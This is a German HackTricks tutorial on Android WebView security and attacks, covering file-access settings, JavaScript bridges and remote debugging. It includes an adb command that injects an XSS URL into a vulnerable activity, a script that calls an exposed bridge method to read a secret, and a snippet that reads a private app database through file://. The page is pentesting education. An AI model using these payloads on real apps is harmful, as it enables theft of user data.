# Webview Angriffe

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Anleitung zu WebView-Konfigurationen und Sicherheit

### √úbersicht √ºber WebView-Schwachstellen

Ein entscheidender Aspekt der Android-Entwicklung besteht darin, WebViews korrekt zu behandeln. Diese Anleitung hebt wichtige Konfigurationen und Sicherheitspraktiken hervor, um Risiken im Zusammenhang mit der Verwendung von WebViews zu minimieren.

![WebView Beispiel](<../../.gitbook/assets/image (1190).png>)

### **Dateizugriff in WebViews**

Standardm√§√üig erlauben WebViews den Dateizugriff. Diese Funktionalit√§t wird durch die Methode `setAllowFileAccess()` gesteuert, die seit Android API-Level 3 (Cupcake 1.5) verf√ºgbar ist. Anwendungen mit der Berechtigung **android.permission.READ\_EXTERNAL\_STORAGE** k√∂nnen Dateien aus externem Speicher unter Verwendung eines Datei-URL-Schemas (`file://path/to/file`) lesen.

#### **Veraltete Funktionen: Universeller und Dateizugriff von URLs**

* **Universeller Zugriff von Datei-URLs**: Diese veraltete Funktion erlaubte Cross-Origin-Anfragen von Datei-URLs und stellte aufgrund potenzieller XSS-Angriffe ein erhebliches Sicherheitsrisiko dar. Die Standardeinstellung ist deaktiviert (`false`) f√ºr Apps, die auf Android Jelly Bean und neuer abzielen.
* Verwenden Sie `getAllowUniversalAccessFromFileURLs()`, um diese Einstellung zu √ºberpr√ºfen.
* Verwenden Sie `setAllowUniversalAccessFromFileURLs(boolean)`, um diese Einstellung zu √§ndern.
* **Dateizugriff von Datei-URLs**: Diese Funktion, ebenfalls veraltet, kontrollierte den Zugriff auf Inhalte von anderen Datei-URL-Schemas. Wie der universelle Zugriff ist die Standardeinstellung aus Sicherheitsgr√ºnden deaktiviert.
* Verwenden Sie `getAllowFileAccessFromFileURLs()` zum √úberpr√ºfen und `setAllowFileAccessFromFileURLs(boolean)` zum Einstellen.

#### **Sicherer Dateiload**

Um den Dateisystemzugriff zu deaktivieren, aber dennoch auf Assets und Ressourcen zuzugreifen, wird die Methode `setAllowFileAccess()` verwendet. Ab Android R und h√∂her ist die Standardeinstellung `false`.

* √úberpr√ºfen Sie mit `getAllowFileAccess()`.
* Aktivieren oder deaktivieren Sie mit `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Die Klasse **WebViewAssetLoader** ist der moderne Ansatz zum Laden lokaler Dateien. Sie verwendet http(s)-URLs zum Zugriff auf lokale Assets und Ressourcen, die sich an der Same-Origin-Richtlinie orientieren und somit das CORS-Management erleichtern.

### loadUrl

Dies ist eine h√§ufig verwendete Funktion zum Laden beliebiger URLs in einer WebView:
```java
webview.loadUrl("<url here>")
```
Nat√ºrlich sollte ein potenzieller Angreifer niemals in der Lage sein, **die URL zu kontrollieren**, die eine Anwendung laden wird.

### **JavaScript und Intent-Schema-Handling**

* **JavaScript**: Standardm√§√üig in WebViews deaktiviert, kann es √ºber `setJavaScriptEnabled()` aktiviert werden. Es wird empfohlen, Vorsicht walten zu lassen, da das Aktivieren von JavaScript ohne angemessene Sicherheitsvorkehrungen Sicherheitsl√ºcken einf√ºhren kann.
* **Intent-Schema**: WebViews k√∂nnen das `intent`-Schema verarbeiten, was potenziell zu Exploits f√ºhren kann, wenn nicht sorgf√§ltig verwaltet. Ein Beispiel f√ºr eine Sicherheitsl√ºcke beinhaltete einen freiliegenden WebView-Parameter "support\_url", der ausgenutzt werden konnte, um Cross-Site-Scripting (XSS)-Angriffe auszuf√ºhren.

![Verwundbare WebView](<../../.gitbook/assets/image (1191).png>)

Beispiel f√ºr die Ausnutzung mit adb:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://example.com/xss.html"
```
{% endcode %}

### JavaScript-Br√ºcke

Android bietet eine Funktion, die es **JavaScript** in einem WebView erm√∂glicht, **native Android-App-Funktionen** aufzurufen. Dies wird durch die Verwendung der Methode `addJavascriptInterface` erreicht, die JavaScript mit nativen Android-Funktionalit√§ten integriert, die als _WebView JavaScript-Br√ºcke_ bezeichnet werden. Es wird zur Vorsicht geraten, da diese Methode allen Seiten innerhalb des WebViews den Zugriff auf das registrierte JavaScript-Interface-Objekt erm√∂glicht, was ein Sicherheitsrisiko darstellt, wenn √ºber diese Schnittstellen sensible Informationen preisgegeben werden.

* F√ºr Apps, die auf Android-Versionen unter 4.2 abzielen, ist **√§u√üerste Vorsicht geboten**, da eine Sicherheitsl√ºcke besteht, die die Ausf√ºhrung von Remote-Code durch b√∂sartiges JavaScript erm√∂glicht, das Reflexion ausnutzt.

#### Implementierung einer JavaScript-Br√ºcke

* **JavaScript-Schnittstellen** k√∂nnen mit nativem Code interagieren, wie in den Beispielen gezeigt, in denen eine Klassenmethode f√ºr JavaScript freigegeben wird:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* JavaScript Bridge wird aktiviert, indem eine Schnittstelle zum WebView hinzugef√ºgt wird:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* M√∂gliche Ausnutzung durch JavaScript, beispielsweise √ºber einen XSS-Angriff, erm√∂glicht das Aufrufen von freigelegten Java-Methoden:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Um Risiken zu minimieren, **beschr√§nken Sie die Verwendung der JavaScript-Bridge** auf den mit der APK ausgelieferten Code und verhindern Sie das Laden von JavaScript aus externen Quellen. F√ºr √§ltere Ger√§te sollte das minimale API-Level auf 17 gesetzt werden.

### Reflektionsbasierte Remote Code Execution (RCE)

* Eine dokumentierte Methode erm√∂glicht die Erzielung von RCE durch Reflektion durch Ausf√ºhren eines spezifischen Payloads. Die `@JavascriptInterface`-Annotation verhindert jedoch unberechtigten Methodenzugriff und begrenzt die Angriffsfl√§che.

### Remote Debugging

* **Remote Debugging** ist mit den **Chrome Developer Tools** m√∂glich, was eine Interaktion und beliebige JavaScript-Ausf√ºhrung innerhalb des WebView-Inhalts erm√∂glicht.

#### Aktivierung des Remote Debugging

* Das Remote Debugging kann f√ºr alle WebViews innerhalb einer Anwendung aktiviert werden, indem:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Um das Debuggen bedingt basierend auf dem Debuggable-Zustand der Anwendung zu aktivieren:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltration beliebiger Dateien

* Zeigt die Exfiltration beliebiger Dateien unter Verwendung eines XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referenzen

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
